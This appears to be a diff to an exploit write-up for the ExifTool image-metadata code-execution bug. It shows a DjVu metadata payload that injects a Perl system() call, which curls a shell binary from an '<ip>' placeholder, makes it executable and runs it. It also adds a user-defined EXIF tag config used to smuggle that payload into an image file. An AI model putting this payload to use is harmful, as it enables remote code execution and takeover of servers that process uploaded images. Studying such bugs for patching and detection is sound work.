@@ -64,6 +64,24 @@ Payload file.
 	
 `(metadata "\c${system('curl <ip>/shell.elf && chmod 777 /tmp/shell.elf && /tmp/shell.elf')};")`
 
+configfile contents.  
+
+```
+%Image::ExifTool::UserDefined = (
+    # All EXIF tags are added to the Main table, and WriteGroup is used to
+    # specify where the tag is written (default is ExifIFD if not specified):
+    'Image::ExifTool::Exif::Main' => {
+        # Example 1.  EXIF:NewEXIFTag
+        0xc51b => {
+            Name => 'HasselbladExif',
+            Writable => 'string',
+            WriteGroup => 'IFD0',
+        },
+        # add more user-defined EXIF tags here...
+    },
+);
+1; #end%
+```
 
 Commands.
 
